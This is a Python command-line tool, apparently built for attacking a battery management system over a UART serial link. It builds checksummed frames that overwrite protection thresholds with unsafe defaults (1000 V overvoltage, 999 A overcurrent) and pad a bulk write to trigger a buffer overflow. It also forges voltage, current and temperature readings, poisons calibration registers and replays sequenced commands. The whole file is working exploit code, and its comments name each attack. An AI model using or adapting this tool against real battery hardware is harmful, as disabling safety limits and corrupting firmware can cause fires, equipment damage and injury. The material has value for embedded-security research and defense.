#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import select
import struct
import subprocess
import sys
import time

try:
    import serial
except ModuleNotFoundError:
    serial = None

BMS_UART_PREAMBLE = 0xAA

BMS_CMD_WRITEALL = 0x02
BMS_CMD_WRITEDEVICE = 0x04

BMS_REG_STATE_VOLT = 0x20
BMS_REG_STATE_CURR = 0x21
BMS_REG_STATE_TEMP = 0x22
BMS_REG_CALIB_VOFF = 0x30
BMS_REG_CALIB_IGAIN = 0x31
BMS_REG_CALIB_TOFF = 0x32

FIELD_MAP = {
    "state_voltage": (BMS_REG_STATE_VOLT, 10.0, "pack_voltage V"),
    "state_current": (BMS_REG_STATE_CURR, 10.0, "pack_current A"),
    "state_temp": (BMS_REG_STATE_TEMP, 10.0, "pack_temp C"),
    "calib_voff": (BMS_REG_CALIB_VOFF, 10.0, "voltage_offset V"),
    "calib_igain": (BMS_REG_CALIB_IGAIN, 100.0, "current_gain"),
    "calib_toff": (BMS_REG_CALIB_TOFF, 10.0, "temp_offset C"),
}

MXM_CRC8_TABLE = [
    0x00, 0x3E, 0x7C, 0x42, 0xF8, 0xC6, 0x84, 0xBA, 0x95, 0xAB, 0xE9, 0xD7, 0x6D, 0x53, 0x11, 0x2F,
    0x4F, 0x71, 0x33, 0x0D, 0xB7, 0x89, 0xCB, 0xF5, 0xDA, 0xE4, 0xA6, 0x98, 0x22, 0x1C, 0x5E, 0x60,
    0x9E, 0xA0, 0xE2, 0xDC, 0x66, 0x58, 0x1A, 0x24, 0x0B, 0x35, 0x77, 0x49, 0xF3, 0xCD, 0x8F, 0xB1,
    0xD1, 0xEF, 0xAD, 0x93, 0x29, 0x17, 0x55, 0x6B, 0x44, 0x7A, 0x38, 0x06, 0xBC, 0x82, 0xC0, 0xFE,
    0x59, 0x67, 0x25, 0x1B, 0xA1, 0x9F, 0xDD, 0xE3, 0xCC, 0xF2, 0xB0, 0x8E, 0x34, 0x0A, 0x48, 0x76,
    0x16, 0x28, 0x6A, 0x54, 0xEE, 0xD0, 0x92, 0xAC, 0x83, 0xBD, 0xFF, 0xC1, 0x7B, 0x45, 0x07, 0x39,
    0xC7, 0xF9, 0xBB, 0x85, 0x3F, 0x01, 0x43, 0x7D, 0x52, 0x6C, 0x2E, 0x10, 0xAA, 0x94, 0xD6, 0xE8,
    0x88, 0xB6, 0xF4, 0xCA, 0x70, 0x4E, 0x0C, 0x32, 0x1D, 0x23, 0x61, 0x5F, 0xE5, 0xDB, 0x99, 0xA7,
    0xB2, 0x8C, 0xCE, 0xF0, 0x4A, 0x74, 0x36, 0x08, 0x27, 0x19, 0x5B, 0x65, 0xDF, 0xE1, 0xA3, 0x9D,
    0xFD, 0xC3, 0x81, 0xBF, 0x05, 0x3B, 0x79, 0x47, 0x68, 0x56, 0x14, 0x2A, 0x90, 0xAE, 0xEC, 0xD2,
    0x2C, 0x12, 0x50, 0x6E, 0xD4, 0xEA, 0xA8, 0x96, 0xB9, 0x87, 0xC5, 0xFB, 0x41, 0x7F, 0x3D, 0x03,
    0x63, 0x5D, 0x1F, 0x21, 0x9B, 0xA5, 0xE7, 0xD9, 0xF6, 0xC8, 0x8A, 0xB4, 0x0E, 0x30, 0x72, 0x4C,
    0xEB, 0xD5, 0x97, 0xA9, 0x13, 0x2D, 0x6F, 0x51, 0x7E, 0x40, 0x02, 0x3C, 0x86, 0xB8, 0xFA, 0xC4,
    0xA4, 0x9A, 0xD8, 0xE6, 0x5C, 0x62, 0x20, 0x1E, 0x31, 0x0F, 0x4D, 0x73, 0xC9, 0xF7, 0xB5, 0x8B,
    0x75, 0x4B, 0x09, 0x37, 0x8D, 0xB3, 0xF1, 0xCF, 0xE0, 0xDE, 0x9C, 0xA2, 0x18, 0x26, 0x64, 0x5A,
    0x3A, 0x04, 0x46, 0x78, 0xC2, 0xFC, 0xBE, 0x80, 0xAF, 0x91, 0xD3, 0xED, 0x57, 0x69, 0x2B, 0x15,
]


def mxm_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = MXM_CRC8_TABLE[b ^ crc]
    return crc


def build_frame(payload: bytes) -> bytes:
    length = len(payload)
    checksum = sum(payload) & 0xFF
    return bytes([BMS_UART_PREAMBLE, length]) + payload + bytes([checksum])


# 阈值表批量写入；可通过 padding 构造溢出攻击
def build_writeall(ovp: float, uvp: float, ocp: float, otp: float, utp: float, pad_bytes: int, pad_value: int) -> bytes:
    payload = struct.pack("<fffff", ovp, uvp, ocp, otp, utp)
    if pad_bytes > 0:
        payload += bytes([pad_value & 0xFF]) * pad_bytes
    data = bytes([BMS_CMD_WRITEALL]) + payload
    return build_frame(data)


def pack_scaled(value: float, scale: float, field_name: str) -> int:
    raw = int(round(value * scale))
    if raw < -32768 or raw > 32767:
        raise ValueError(f"{field_name} out of int16 range after scaling: {raw}")
    return raw & 0xFFFF


# 用于状态伪造、校准污染、重放攻击
def build_write_device(reg: int, raw_u16: int, seq: int | None) -> bytes:
    lsb = raw_u16 & 0xFF
    msb = (raw_u16 >> 8) & 0xFF
    crc = mxm_crc8(bytes([BMS_CMD_WRITEDEVICE, reg, lsb, msb]))
    data = bytes([BMS_CMD_WRITEDEVICE, reg, lsb, msb, crc])
    if seq is not None:
        data += bytes([seq & 0xFF])
    return build_frame(data)


def send_frames(port: str, baud: int, frame: bytes, repeat: int, delay: float, no_dtr: bool,
                capture_seconds: float, log_path: str | None) -> None:
    print(f"Sending {repeat} frame(s) to {port} ({baud} baud): {frame.hex()}")
    if serial is None:
        send_frames_posix(port, baud, frame, repeat, delay, capture_seconds, log_path)
        return

    try:
        with serial.Serial(port, baud, timeout=0.05) as ser:
            if no_dtr:
                ser.dtr = False
                ser.rts = False
            ser.reset_input_buffer()

            log_file = open(log_path, "wb") if log_path else None
            try:
                for i in range(repeat):
                    ser.write(frame)
                    ser.flush()

                    if log_file is not None:
                        while ser.in_waiting:
                            chunk = ser.read(ser.in_waiting)
                            if chunk:
                                log_file.write(chunk)

                    if i + 1 < repeat:
                        time.sleep(delay)

                if log_file is not None and capture_seconds > 0:
                    end_time = time.time() + capture_seconds
                    while time.time() < end_time:
                        chunk = ser.read(ser.in_waiting or 1)
                        if chunk:
                            log_file.write(chunk)
            finally:
                if log_file is not None:
                    log_file.close()

        if log_path:
            print(f"UART log saved to {log_path}")
    except Exception as exc:
        sys.exit(f"Serial send failed: {exc}")


def send_frames_posix(port: str, baud: int, frame: bytes, repeat: int, delay: float,
                      capture_seconds: float, log_path: str | None) -> None:
    try:
        subprocess.run(
            [
                "stty",
                "-F",
                port,
                str(baud),
                "raw",
                "-echo",
                "cs8",
                "-cstopb",
                "-parenb",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        fd = os.open(port, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
    except Exception as exc:
        sys.exit(f"Serial setup failed (no pyserial fallback): {exc}")

    try:
        while True:
            try:
                if not os.read(fd, 4096):
                    break
            except BlockingIOError:
                break

        log_file = open(log_path, "wb") if log_path else None
        try:
            for i in range(repeat):
                total = 0
                while total < len(frame):
                    total += os.write(fd, frame[total:])

                if log_file is not None:
                    while True:
                        ready, _, _ = select.select([fd], [], [], 0)
                        if not ready:
                            break
                        try:
                            chunk = os.read(fd, 4096)
                        except BlockingIOError:
                            break
                        if not chunk:
                            break
                        log_file.write(chunk)

                if i + 1 < repeat:
                    time.sleep(delay)

            if log_file is not None and capture_seconds > 0:
                end_time = time.time() + capture_seconds
                while time.time() < end_time:
                    ready, _, _ = select.select([fd], [], [], 0.1)
                    if not ready:
                        continue
                    try:
                        chunk = os.read(fd, 4096)
                    except BlockingIOError:
                        continue
                    if chunk:
                        log_file.write(chunk)
        finally:
            if log_file is not None:
                log_file.close()

        if log_path:
            print(f"UART log saved to {log_path}")
    except Exception as exc:
        sys.exit(f"Serial send failed (no pyserial fallback): {exc}")
    finally:
        os.close(fd)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", default="/dev/ttyACM0")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--attack", choices=["writeall", "overflow", "state", "calib", "replay"], default="writeall")
    ap.add_argument("--field", choices=sorted(FIELD_MAP.keys()))
    ap.add_argument("--value", type=float)
    ap.add_argument("--seq", type=int)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--delay", type=float, default=0.2)
    ap.add_argument("--pad-bytes", type=int, default=0)
    ap.add_argument("--pad-value", type=lambda s: int(s, 0), default=0x42)
    ap.add_argument("--no-dtr", action="store_true", help="disable DTR/RTS toggling to avoid reset")
    ap.add_argument("--capture-seconds", type=float, default=0.0, help="seconds to capture UART after send")
    ap.add_argument("--log", help="path to save captured UART output (binary)")
    ap.add_argument("--ovp", type=float, default=1000.0)
    ap.add_argument("--uvp", type=float, default=50.0)
    ap.add_argument("--ocp", type=float, default=999.0)
    ap.add_argument("--otp", type=float, default=20.0)
    ap.add_argument("--utp", type=float, default=-40.0)
    args = ap.parse_args()

    # 状态伪造 / 校准污染 / 重放攻击（WRITEDEVICE）
    if args.attack in {"state", "calib", "replay"}:
        field = args.field
        if field is None:
            field = "state_voltage" if args.attack == "state" else "calib_voff"
        reg, scale, desc = FIELD_MAP[field]
        if args.value is None:
            args.value = 999.0 if args.attack == "state" else 10.0
        raw_u16 = pack_scaled(args.value, scale, field)
        seq = args.seq if args.attack == "replay" else None
        frame = build_write_device(reg, raw_u16, seq)
        print(f"WRITEDEVICE field={field} ({desc}) value={args.value}")
    else:
        # 阈值写入 / 溢出攻击（WRITEALL）
        pad_bytes = args.pad_bytes
        if args.attack == "overflow" and pad_bytes == 0:
            pad_bytes = 16
        frame = build_writeall(args.ovp, args.uvp, args.ocp, args.otp, args.utp, pad_bytes, args.pad_value)
        print(f"WRITEALL ovp={args.ovp} uvp={args.uvp} ocp={args.ocp} otp={args.otp} utp={args.utp} pad={pad_bytes}")

    send_frames(args.port, args.baud, frame, args.repeat, args.delay, args.no_dtr,
                args.capture_seconds, args.log)
    print("Done. Check device UART for [BMS-RX] and MemManage logs.")


if __name__ == "__main__":
    main()
